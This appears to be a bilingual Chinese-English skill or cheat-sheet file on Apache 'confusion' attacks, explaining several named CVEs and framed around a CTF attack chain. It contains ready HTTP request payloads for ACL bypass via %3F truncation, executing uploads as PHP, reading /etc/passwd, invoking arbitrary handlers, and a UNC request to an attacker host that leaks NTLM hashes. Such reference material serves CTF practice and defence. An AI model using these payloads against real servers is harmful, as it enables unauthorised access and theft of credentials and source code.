---
name: apache-confusion
description: Use when encountering Apache 语义混淆攻击 - Filename Confusion、DocumentRoot Confusion、Handler Confusion、CVE-2024-38475/38476
---

# Apache Confusion Attacks

## Info

- **Tags**: apache, confusion, acl-bypass, source-leak, CVE-2024-38475
- **相关 CVE**: CVE-2024-38475, CVE-2024-38476, CVE-2023-38709, CVE-2017-15715

---

## 核心问题

Apache 不同模块对 `request_rec` 结构体中关键字段的**语义理解不一致**：

- `r->filename`: 应为文件系统路径，但某些模块视为 URL
- `r->handler` / `r->content_type`: handler 为空时，content_type 被当作处理器

---

## 1. Filename Confusion（路径截断 + ACL 绕过）

### 原理

`mod_rewrite` 的 `RewriteRule` 会调用 `splitout_queryargs()`：
- 找到 `r->filename` 中第一个 `?`
- 将 `?` 后作为查询参数
- **截断 `r->filename`，只保留 `?` 之前**

### CVE-2024-38475：路径截断

```
# 利用 ? 截断 RewriteRule 目标
GET /protected_file.php%3f HTTP/1.1
# %3f 被 mod_rewrite 解析为 ?，截断路径，绕过认证

# 将图片当 PHP 执行
GET /upload/image.jpg%3f.php HTTP/1.1
# 截断后，H=application/x-httpd-php 标志被应用到 image.jpg
```

### ACL Bypass

```
# 在受保护文件名后加 %3F
GET /admin/config.php%3F HTTP/1.1
# 认证模块看到的是 /admin/config.php%3F（被拦截）
# mod_proxy 看到的是 /admin/config.php（正确转发）
```

---

## 2. DocumentRoot Confusion（源码泄露 + 本地跳板）

### 原理

Apache 对 Server Config / VirtualHost 中的 `RewriteRule`，会尝试**两种路径**：
- 带 DocumentRoot 的
- 不带 DocumentRoot 的（绝对路径）

### 源码泄露

```
# 通过绝对路径访问，使 .php 不被解释执行
GET /etc/passwd HTTP/1.1
# 如果 Apache 未配置对应 handler，返回源码
```

### 利用 /usr/share 下的本地跳板

```
# 利用系统目录下的示例文件
GET /usr/share/doc/phpmyadmin/...  → 信息泄露
GET /usr/share/redmine/...         → 符号链接 → 读系统文件
```

### CVE-2017-15715：换行解析漏洞

```
# 上传文件名包含换行符
filename: shell.php\x0A
# Apache 老版本中，换行符导致多阶段匹配失败，文件被当作 PHP 执行
```

---

## 3. Handler Confusion（处理器覆盖 + 任意调用）

### 原理

历史遗留代码：`r->handler` 为空时，使用 `r->content_type` 作为处理器

### CVE-2023-38709：处理器覆盖导致源码泄露

```
# 触发 ModSecurity 错误
# r->content_type 被覆写为 text/html
# PHP 文件被当静态文件返回，泄露源码
```

### CVE-2024-38476：调用任意处理器

```
# 通过 CGI 的服务器端重定向
# 控制 Content-Type 头来调用任意处理器
GET /cgi-bin/test.cgi HTTP/1.1
Content-Type: application/x-httpd-php
# 调用 server-status、mod_proxy 等处理器
```

---

## 4. Windows UNC SSRF（CVE-2024-38472）

```
# Windows 上 Apache 支持 UNC 路径
GET //attacker/share/file HTTP/1.1
# 迫使服务器发起 SMB 请求 → SSRF / NTLM hash 泄露
```

---

## CTF 攻击链

```
1. 识别 Apache（Server 响应头 / 端口 80/443）
2. 检查是否有 mod_rewrite 规则
3. 尝试 %3F 截断绕过 ACL
4. 尝试绝对路径读取源码
5. 检查 /usr/share 目录下的可用跳板
6. 如有上传 → 换行文件名解析绕过
7. 检查 Windows 环境 → UNC SSRF
```
